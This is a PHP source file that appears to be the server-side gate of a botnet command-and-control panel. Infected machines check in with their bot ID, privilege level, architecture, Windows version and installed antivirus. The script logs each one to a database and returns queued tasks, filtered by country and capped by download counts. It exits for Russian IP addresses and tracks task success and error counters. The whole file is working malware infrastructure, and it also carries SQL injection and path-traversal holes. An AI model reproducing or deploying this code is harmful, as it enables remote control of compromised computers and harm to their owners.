<?php

    error_reporting( 0 );

    function aGetCountryIndex( $ip )
    {
       include_once( "f.st/geo_ip.php" );
       $geoip = geo_ip::getInstance( "f.st/geo_ip.dat" );
       return $geoip -> lookupCountryCode( $ip );
    }

    function aGetCountry( $ip )
    {
       include_once( "f.st/geo_ip.php" );
       $geoip = geo_ip::getInstance( "f.st/geo_ip.dat" );
       return $geoip -> lookupCountryName( $ip );
    }

    function GetIP() 
    {
       if ( !empty( $_SERVER["HTTP_CLIENT_IP"] ) ) 
       {
          $ip = $_SERVER["HTTP_CLIENT_IP"];
       } 
       elseif ( !empty( $_SERVER["HTTP_X_FORWARDED_FOR"] ) ) 
       {
          $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
       } 
       else 
       {
          $ip = $_SERVER["REMOTE_ADDR"];
       }
       
       return $ip;
    }
 
    function WriteToEof( $filename, $content ) 
    {
		
       $f = fopen( $filename, "a" );
       fwrite( $f, $content . PHP_EOL );

       fclose( $f );
	
	
    
}

    function CheckFileContent( $filename, $content ) 
    {
       if( strpos( file_get_contents( $filename ), $content ) == false ) 
       {
          return "0";
       }
       else
       {
          return "1";
       }
    }

    function IncreaseCount( $FileName )
    {
       if ( file_exists( $FileName ) ) 
       {
          $fp = fopen( $FileName, "r");
          $counter = fread( $fp, filesize( $FileName ) );
          fclose( $fp );
       } 
       else 
       {
          $counter = 0;
       }

       $counter++;

       $fp = fopen( $FileName, "w" );
       fwrite( $fp, $counter );
       fclose( $fp ); 
    }

    function GetTaskContent( $unit_id ) 
    {
       $filelist = glob( "./tasks/*.tsk" );

       if ( $handle = opendir( "./tasks/" ) ) 
       {     
          while ( $entry = readdir( $handle ) ) 
          {
            if ( strpos( $entry, "*" ) === 0 ) 
            {
               $filelist[] = $entry;
            }
          }

          closedir( $handle );
          $bot_country = aGetCountryIndex( GetIP() );

          for ( $i = 0; $i < count( $filelist ); $i++ )
          {
             $n = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".n" );
             $d = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".d0" );
             $u = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".i" );
             $ct = file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".ct" );

             if ( $u == "*" || $u == $unit_id )
             {           
                if ( $n > $d ) 
                {
                   if ( CheckFileContent( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".l", $unit_id ) == 0 )
                   { 

                      if ( !CheckFileContent( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".ct", $bot_country ) == 0 || (  $ct == ".*" ) )
                      {                  
                         $res = $res . file_get_contents( $filelist[$i] ) . "#";
                         IncreaseCount( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".d0" );
                         WriteToEof( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".l", "." . $unit_id );
                      }

                   }

                }

             }
          } 
       }

       if ( strcmp( aGetCountryIndex( GetIP() ), "RU" ) == 0 )
          die;

       return $res;
    }

    function AddToBase( $bot_id, $version, $ar, $bi, $os, $av ) 
    { 
       $time = time();
       $bot_ip = GetIP();
       $country = aGetCountry( "$bot_ip" );

       switch ( $os ) 
       {
          case 1: $os = "Windows 10";
          break;
          case 2: $os = "Server 2016";
          break;
          case 3: $os = "Windows 8.1";
          break;
          case 4: $os = "Server 2012 R2";
          break;
          case 5: $os = "Windows 8";
          break;
          case 6: $os = "Server 2012";
          break;
          case 7: $os = "Windows Vista";
          break;
          case 8: $os = "Server 2008";
          break;
          case 9: $os = "Windows 7";
          break;
          case 10: $os = "Server 2008 R2";
          break;
          case 11: $os = "Server 2003 R2";
          break;
          case 12: $os = "Windows XP";
          break;
          case 13: $os = "Server 2003";
          break;
          case 14: $os = "Windows XP SE";
          break;
          case 15: $os = "Server 2000";
          break;
       }

       switch ( $av ) 
       {
          case 0: $av = "N/A";
          break;
          case 1: $av = "Avast";
          break;
          case 2: $av = "Avira";
          break;
          case 3: $av = "Kaspersky";
          break;
          case 4: $av = "NOD32";
          break;
          case 5: $av = "Panda";
          break;
          case 6: $av = "DrWEB";
          break;
          case 7: $av = "AVG";
          break;
          case 8: $av = "360 TS";
          break;
          case 9: $av = "Bitdefender";
          break;
          case 10: $av = "Norton";
          break;
          case 11: $av = "Sophos";
          break;
          case 12: $av = "Comodo";
          break;
       }

       if ( $ar == 0 )
       {
          $ar = "User";
       }

       if ( $ar == 1 )
       {
          $ar = "Admin";
       }

       if ( $bi == 0 )
       {
          $bi = "x32";
       }

       if ( $bi == 1 )
       {
          $bi = "x64";
       }

       include( "config.php" );
       mysql_connect( $conf["dbhost"], $conf["dbuser"], $conf["dbpass"] );
       mysql_select_db( $conf["dbname"] );

       list( $id, $online ) = mysql_fetch_array( mysql_query( "SELECT id, online FROM units WHERE id = '$bot_id' LIMIT 1" ) );  

       if ( $id ) 
       { 
          mysql_query( "UPDATE units SET ip = '$bot_ip', online = '$time', country = '$country', ar = '$ar', arch = '$bi', version = '$version', av = '$av' WHERE id = '$bot_id' LIMIT 1" );
       } 
       else 
       { 
          mysql_query( "INSERT INTO units ( id, ip, online, country, ar, arch, version, os, av, reg ) VALUES ( '$bot_id', '$bot_ip', '$time', '$country', '$ar', '$bi', '$version', '$os', '$av', '$time' )" );       
       } 

       mysql_close();
    }


    if ( $_POST["e0"] ) 
    {
       IncreaseCount( "./tasks/" . $_POST["e0"] . ".e0" );
       exit;
    }

    if ( $_POST["e1"] ) 
    {
       IncreaseCount( "./tasks/" . $_POST["e1"] . ".e1" );
       exit;
    }

    if ( $_POST["d1"] ) 
    {
       IncreaseCount( "./tasks/" . $_POST["d1"] . ".d1" );
       exit;
    }

    if ( $_POST["id"] && $_POST["vs"] )
    {	
       AddToBase( $_POST["id"], $_POST["vs"], $_POST["ar"], $_POST["bi"], $_POST["os"], $_POST["av"] );	          
       
       if ( $_POST["lv"] == 0 )
       {
          echo GetTaskContent( $_POST["id"] );
       }

       exit;
    }

    header( "Refresh: 1; url = login.php" );

?>
